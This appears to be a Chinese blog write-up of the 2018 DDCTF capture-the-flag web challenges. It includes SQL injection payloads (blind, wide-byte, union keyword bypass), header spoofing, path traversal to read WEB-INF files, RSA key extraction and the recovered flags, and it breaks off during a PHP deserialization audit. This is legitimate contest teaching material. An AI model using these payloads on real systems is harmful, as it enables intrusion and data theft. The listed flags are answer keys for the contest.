<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
   
    <meta name="keywords" content="ddctf,writeup" />
  
  
  
  
  <title>2018DDCTF  writeup | 丶诺熙丨5am3</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="第二次参加滴滴的比赛，第一次是刚接触CTF不久。身为一个web狗，做出两道逆向题。 这是第二次，总的来说，题目对新人还是蛮友好的，而且还能学到很多东西。 时间方面，也还不错。体验到了肛题的快感。这次…蛮可惜的。差一点就ak了web题。 还好时间不够了。否则后面那道java一定会折磨我许久。 最后，赞一下各位出题师傅，题目很喜欢！ 还有安姐姐也辛苦了。这一周，看到安姐姐基本上天天通宵。">
<meta property="og:type" content="article">
<meta property="og:title" content="2018DDCTF  writeup">
<meta property="og:url" content="https://blog.5am3.com/2018/04/24/ddctf2018/index.html">
<meta property="og:site_name" content="丶诺熙丨5am3">
<meta property="og:description" content="第二次参加滴滴的比赛，第一次是刚接触CTF不久。身为一个web狗，做出两道逆向题。 这是第二次，总的来说，题目对新人还是蛮友好的，而且还能学到很多东西。 时间方面，也还不错。体验到了肛题的快感。这次…蛮可惜的。差一点就ak了web题。 还好时间不够了。否则后面那道java一定会折磨我许久。 最后，赞一下各位出题师傅，题目很喜欢！ 还有安姐姐也辛苦了。这一周，看到安姐姐基本上天天通宵。">
<meta property="og:locale">
<meta property="og:image" content="https://img.5am3.com/img/180414/CLmbAc4f7j.png">
<meta property="og:image" content="https://img.5am3.com/img/180414/dGfL1C7DDJ.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/AbdF2ADGA3.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/aj9dA0CmKl.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/m1i9IHi9H4.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/5akEdiAE93.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/5FK9H98cBm.png">
<meta property="og:image" content="https://img.5am3.com/img/180416/F3F2KEjgKb.png">
<meta property="og:image" content="https://img.5am3.com/img/180416/f345fDj20l.png">
<meta property="og:image" content="https://img.5am3.com/img/180416/jmeKeiBC89.png">
<meta property="og:image" content="https://img.5am3.com/img/180416/aeBdKbceba.png">
<meta property="og:image" content="https://img.5am3.com/img/180416/H3dE1bEeC8.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/fbLcGAFJ4a.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/EL389D98Lb.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/CkLdA2d7gD.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/bAGKCC8KEk.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/c1c4eeFhhi.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/3iC0KHeBd4.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/E8I6mh7ie9.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/e5eCF99g1b.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/4eiEJejmeJ.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/HlF2LhKjaE.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/4EiBcAcJ4F.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/IFf3H6L8I2.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/JmcdCf9Lk8.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/d3Dd8A1eg8.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/4kH7ml65cG.png">
<meta property="og:image" content="https://img.5am3.com/img/180414/DJJgj7G8m9.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/8EheaAIHLI.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/51k5a6LgEL.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/e7idiEm4kD.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/IejD01mAdG.png">
<meta property="og:image" content="https://img.5am3.com/img/180415/c5Bbi3bc9i.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/a5gJ6kKHdE.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/b5AFL2bKKH.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/K6H9B5H4d8.png">
<meta property="og:image" content="https://img.5am3.com/img/180420/8dmC106gg8.png">
<meta property="article:published_time" content="2018-04-24T07:38:40.000Z">
<meta property="article:modified_time" content="2024-12-05T02:39:41.684Z">
<meta property="article:author" content="丶诺熙">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="web">
<meta property="article:tag" content="misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.5am3.com/img/180414/CLmbAc4f7j.png">
  
    <link rel="alternative" href="/atom.xml" title="丶诺熙丨5am3" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/avatar.jpg">
  
  
  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
  
  
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
        <script src="https://cdn.bootcdn.net/ajax/libs/require.js/2.1.6/require.min.js"></script>
        <script src="https://cdn.bootcdn.net/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
        <!-- <script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script> -->
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/avatar.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder=" Search...">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/">主页</a></li>
                        
                            <li><a  href="/archives/">归档</a></li>
                        
                            <li><a  href="/tags">标签</a></li>
                        
                            <li><a  href="/categories/">分类</a></li>
                        
                            <li><a  href="/about/">关于</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="https://github.com/5am3" title="github">github</a>
                            
                                <a class="fl weibo"  target="_blank" href="https://weibo.com/5am3" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                                <a class="fl mail"  target="_blank" href="mailto://i@5am3.com" title="mail">mail</a>
                            
                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/5am3" title="zhihu">zhihu</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/0ctf/" style="font-size: 10px;">0ctf</a> <a href="/tags/HEXO/" style="font-size: 12.5px;">HEXO</a> <a href="/tags/csp/" style="font-size: 10px;">csp</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/misc/" style="font-size: 12.5px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/nonce%E7%BB%95%E8%BF%87/" style="font-size: 10px;">nonce绕过</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 10px;">web渗透</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/writeup-web-xss/" style="font-size: 10px;">writeup - web - xss</a> <a href="/tags/xman/" style="font-size: 12.5px;">xman</a> <a href="/tags/xss/" style="font-size: 17.5px;">xss</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">被动扫描</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a>
                    </div>
                </section>
                
                
                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">一个热爱安全的小渣渣！</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/avatar.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">归档</a></li>
                
                    <li><a href="/tags">标签</a></li>
                
                    <li><a href="/categories/">分类</a></li>
                
                    <li><a href="/about/">关于</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="https://github.com/5am3" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="https://weibo.com/5am3" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                        <a class="mail" target="_blank" href="mailto://i@5am3.com" title="mail">mail</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/5am3" title="zhihu">zhihu</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-ddctf2018" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2018/04/24/ddctf2018/" class="article-date">
      <time datetime="2018-04-24T07:38:40.000Z" itemprop="datePublished">2018-04-24</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2018DDCTF  writeup
    </h1>
  


      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/writeup/">writeup</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>第二次参加滴滴的比赛，第一次是刚接触CTF不久。身为一个web狗，做出两道逆向题。</p>
<p>这是第二次，总的来说，题目对新人还是蛮友好的，而且还能学到很多东西。</p>
<p>时间方面，也还不错。体验到了肛题的快感。这次…蛮可惜的。差一点就ak了web题。</p>
<p>还好时间不够了。否则后面那道java一定会折磨我许久。</p>
<p>最后，赞一下各位出题师傅，题目很喜欢！</p>
<p>还有安姐姐也辛苦了。这一周，看到安姐姐基本上天天通宵。</p>
<span id="more"></span>

<p>比赛复现链接： <a href="http://ddctf.didichuxing.com/">http://ddctf.didichuxing.com</a></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1-数据库的秘密-100pt"><a href="#web1-数据库的秘密-100pt" class="headerlink" title="web1 数据库的秘密 (100pt)"></a>web1 数据库的秘密 (100pt)</h3><blockquote>
<p><strong>[注意] 本次DDCTF所有WEB题无需使用也禁止使用扫描器</strong></p>
<p><a href="http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php">http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php</a></p>
</blockquote>
<p>打开后会发现返回如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">非法链接，只允许来自 123.232.23.245 的访问</span><br></pre></td></tr></table></figure>

<p>此时可以通过修改HTTP请求头中的X-Forwarded-For即可。即添加以下字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.232.23.245</span><br></pre></td></tr></table></figure>

<p>在这里，我用的是火狐的一个插件**Modify Header Value (HTTP Headers)**。</p>
<p><img src="https://img.5am3.com/img/180414/CLmbAc4f7j.png" alt="mark"></p>
<p>发现该网页是一个简单的查询列表。再加上题目中给的hint。可以判断为SQL注入题目。</p>
<p>经过测试，发现以上三个点均不是注入点。此时分析数据包，可以发现存在第四个注入点。</p>
<p><img src="https://img.5am3.com/img/180414/dGfL1C7DDJ.png" alt="mark"></p>
<p>然后查看源码，发现一个隐藏字段。经过测试发现，该字段可以注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; &amp;&amp; &#x27;1&#x27;=&#x27;1&#x27;#</span><br><span class="line">admin&#x27; &amp;&amp; &#x27;1&#x27;=&#x27;2&#x27;#</span><br></pre></td></tr></table></figure>

<p>尝试注入 author，可以发现以下内容信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. and （可以用&amp;&amp;代替）</span><br><span class="line">2. union select （很迷，这两个不能同时出现，然而自己又找不到其他方式）</span><br><span class="line">3. 仅允许#号注释</span><br></pre></td></tr></table></figure>



<p>然后注入渣的自己就比较无奈了。。不会啊。只好祭出盲注大法了。经过尝试，最终构造以下payload可用。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; &amp;&amp; binary substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,1) &lt;&#x27;</span>z<span class="string">&#x27; # </span></span><br></pre></td></tr></table></figure>


<p>然后开始写脚本，此时遇到了一个问题。发现他有一个验证。为了check你中途是否修改数据，而加入的一个hash比对。</p>
<p>首先将你的准备传送的内容进行某种hash后变为sig字段，然后再将sig通过get请求一起发送过去。此时服务器端会将sig与你发送的内容的hash比对一下。此时可以减少抓包中途修改内容的可能性。</p>
<p>所以，为了省事，我选择直接将这个代码调用一下。</p>
<p>用python的execjs库，可以直接执行js代码。</p>
<p>最终跑起脚本，获取到flag <code>DDCTF&#123;IKIDLHNZMKFUDEQE&#125;</code></p>
<p><img src="https://img.5am3.com/img/180415/AbdF2ADGA3.png" alt="mark"></p>
<h3 id="web2-专属链接-200pt"><a href="#web2-专属链接-200pt" class="headerlink" title="web2 专属链接 (200pt)"></a>web2 专属链接 (200pt)</h3><blockquote>
<p>现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么</p>
<p>提示1：虽然原网站跟本次CTF没有关系，原网站是<a href="http://www.xiaojukeji.com/">www.xiaojukeji.com</a></p>
<p>注：题目采用springmvc+mybatis编写，<strong>链接至其他域名的链接与本次CTF无关，请不要攻击</strong></p>
<p><a href="http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e">http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e</a></p>
</blockquote>
<p>首先打开网站，发现是滴滴的官网。。</p>
<p>此时发现所有连接几乎全部重定向到了滴滴官网。</p>
<p>无奈下查看元素。发现hint</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--/flag/testflag/yourflag--&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试访问，<code>http://116.85.48.102:5050/flag/testflag/yourflag</code>发现报错500，好像是数组越界？</p>
<p>此时尝试将yourflag替换为DDCTF{1321}，返回failed!!!。</p>
<p>猜测爆破flag么？完全没戏啊。看样子应该有其他地方可以入手。</p>
<p>然而又发现了主页js的一句神奇的话。一个ajax语句。</p>
<p><img src="https://img.5am3.com/img/180415/aj9dA0CmKl.png" alt="mark"></p>
<p>然并卵，404。。。。。</p>
<p>此时只好继续分析题目，发现了令人眼前一亮的东西。对，就是下面这个icon。</p>
<p><img src="https://img.5am3.com/img/180415/m1i9IHi9H4.png" alt="mark"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=</span><br></pre></td></tr></table></figure>

<p>访问后，发现下载了favicon.ico</p>
<p>此时发现图标好像图片很奇怪。后来果然验证了这是个hint。</p>
<p><img src="https://img.5am3.com/img/180415/5akEdiAE93.png" alt="mark"></p>
<p>此时可以愉快地玩耍了，这样一来，题目源码有了，还愁拿不下来么。</p>
<p>美滋滋。此时也知道了题目中hint的用意。<code>题目采用springmvc+mybatis编写</code></p>
<p>百度搜索springmvc+mybatis文件结构，美滋滋读文件。</p>
<p>首先，大概知道了资源文件都是在WEB-INF文件夹下，所以猜测这个icon也在这里，此时我们要先确定文件夹。</p>
<p>WEB-INF下有一个web.xml，此时尝试读取，最终确定目录<code>../../WEB-INF/web.xml</code>。</p>
<p>然后拖文件。这里说几点注意事项。</p>
<blockquote>
<ol>
<li>通过..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml确认位置。</li>
<li>继续根据web.xml中的内容进行文件读取。classpath是<code>WEB-INF/classes</code></li>
<li>读class文件时根据包名判断文件目录<code>com.didichuxing.ctf.listener.InitListener</code> 即为<code>WEB-INF/com/didichuxing/ctf/listener/InitListener.class</code></li>
<li>制造网站报错，进一步找到更多的文件</li>
</ol>
</blockquote>
<p>差不多，注意一上四点，就可以拿到尽量多的源码了。</p>
<p>拖到源码后，就不美滋滋了。。。还好去年在DDCTF学过2017第二题的安卓逆向，会逆向了。</p>
<p>（此时坑点：jd-jui仅可逆jar，需要将class打成压缩包改为jar再逆向）</p>
<p>此时开始苦逼的分析源码。</p>
<p><strong>分析后发现，存在接口，用当前用户的邮箱去生成一个flag。</strong></p>
<p>但是flag是加密的。此时加密流程代码里都有，是一个RSA加密。密钥在服务器中的</p>
<p><img src="https://img.5am3.com/img/180415/5FK9H98cBm.png" alt="mark"></p>
<p>此时又一次明白了，为什么读文件允许ks文件。</p>
<p>来吧，首先先拿邮箱申请一个flag</p>
<p>然而此时申请flag，邮箱也得先加密。自己提取出来的加密脚本如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">byte2hex</span><span class="params">(<span class="type">byte</span>[] b)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">hs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>; (b != <span class="literal">null</span>) &amp;&amp; (n &lt; b.length); n++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">stmp</span> <span class="operator">=</span> Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</span><br><span class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        hs.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      hs.append(stmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getEmail</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeyException&#123;</span><br><span class="line">	  <span class="type">SecretKeySpec</span> <span class="variable">signingKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(<span class="string">&quot;sdl welcome you !&quot;</span>.getBytes(), <span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">	  <span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">      mac.init(signingKey);</span><br><span class="line">	  String email=<span class="string">&quot;3113936212117314317@didichuxing.com&quot;</span>;</span><br><span class="line">	  <span class="type">byte</span>[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line">	  System.out.println(byte2hex(e));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0DFEE0968F44107479B6CF5784641060DB42952C197C7E8560C2B5F58925FAF4</span></span><br></pre></td></tr></table></figure>

<p>坑：但是此时后端仅允许post方式。且参数是以get传递的。</p>
<p>成功获取到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Encrypted flag : 506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE</span><br></pre></td></tr></table></figure>

<p>然后，解密吧。。</p>
<p>只能百度了，java又不熟，RSA更不熟，尤其还是这种hex的。逆源码都失败了。一个劲报错。（查百度，好像是因为啥空格之类的。打不过打不过）</p>
<p>最终发现一个好玩的，可以从keystore提取RSA私钥。这样一来，又继续美滋滋。</p>
<p><a href="https://blog.csdn.net/zbuger/article/details/51690900">https://blog.csdn.net/zbuger/article/details/51690900</a></p>
<p>然后照猫画虎，提出私钥。此时祭出自己的一个无敌大件。之前从某次CTF安卓题提出的RSA解密脚本。（当时题目简单，加解密都给了，改个函数名就ok了。）</p>
<p>(╯°□°）╯︵ ┻━┻</p>
<p>要不是在线的解不了。才不会想起这个大招（已放到附件，记得将 密文to ascii 再 to base64。）。。。。。</p>
<p>通过在线工具，提取出公私钥，然后跑脚本。最终拿到flag。</p>
<p>DDCTF{1797193649441981961}</p>
<h3 id="web3-注入的奥妙-250pt"><a href="#web3-注入的奥妙-250pt" class="headerlink" title="web3 注入的奥妙 (250pt)"></a>web3 注入的奥妙 (250pt)</h3><blockquote>
<p>本题flag不需要包含<code>DDCTF&#123;&#125;</code>，为<code>[0-9a-f]+</code></p>
<p><a href="http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1">http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1</a></p>
</blockquote>
<p>按照题目要求，这题应该是个注入题，毫无疑问。</p>
<p>查看源码，发现给了big5的编码表，此时猜测可以通过宽字节进行注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1餐&#x27; and 1=1%23</span><br></pre></td></tr></table></figure>

<p>orderby，发现有三个字段，尝试构造联合查询语句，发现union会被直接删除。此时<strong>双写</strong>绕过即可。</p>
<p>此时查询数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1餐&#x27; uniunionon select SCHEMA_NAME,2,3 from information_schema.SCHEMATA %23</span><br></pre></td></tr></table></figure>

<p><img src="https://img.5am3.com/img/180416/F3F2KEjgKb.png" alt="mark"></p>
<p>然后继续查询表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1餐&#x27; uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=sqli %23</span><br></pre></td></tr></table></figure>

<p>此时发生了一件尴尬的事情。我们无法继续构造单双引号，这样数据库会报以下错误。</p>
<p><img src="https://img.5am3.com/img/180416/f345fDj20l.png" alt="mark"></p>
<p>此时祭出hex大法。数据库会直接将0x开头的进行转码解析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1餐&#x27; uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=0x73716c69 %23</span><br></pre></td></tr></table></figure>

<p>此时成功的爆出来了三个表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message,route_rules,users</span><br></pre></td></tr></table></figure>

<p>然后就没啥好说的了。挨个查着玩就可以了，基本同上。然后查字段啥的。</p>
<p><em>查路由的时候，有点小坑，不知道后端怎么解析的，会将一列数据解析到多列，此时用mysql的to_base64()函数即可。</em></p>
<p>通过路由信息，我们可以发现存在<code>static/bootstrap/css/backup.css </code>源码泄露。</p>
<p>通过以下三行脚本即可保存该文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">f=open(&#x27;a.zip&#x27;,&#x27;wb&#x27;)</span><br><span class="line">f.write(requests.get(&#x27;http://116.85.48.105:5033/static/bootstrap/css/backup.css&#x27;).content)</span><br></pre></td></tr></table></figure>



<p>接下来就是对PHP代码的审计。</p>
<p>首先，分析路由。我们从数据表内知道了有以下几条规则</p>
<blockquote>
<p>get*&#x2F;:u&#x2F;well&#x2F;getmessage&#x2F;:s       Well#getmessage<br>get*&#x2F;:u&#x2F;justtry&#x2F;self&#x2F;:s       JustTry#self<br>post*&#x2F;:u&#x2F;justtry&#x2F;try          JustTry#try       </p>
</blockquote>
<p>首先第一条，就是咱刚刚实现注入的那一个。不用多看，逻辑差不多清楚。</p>
<p>第二，三条，调用的都是justtry类下的某个方法。所以可以跟进去，重点分析下这个函数。</p>
<p><img src="https://img.5am3.com/img/180416/jmeKeiBC89.png" alt="mark"></p>
<p>此时看见了 unserialize ，倍感亲切，这不就是反序列化么。</p>
<p>此时就需要考虑反序列化了。他后面限制了几个类，此时我们可以一一打开分析。</p>
<p>test类，顾名思义，就是一个测试用的。</p>
<p><img src="https://img.5am3.com/img/180416/aeBdKbceba.png" alt="mark"></p>
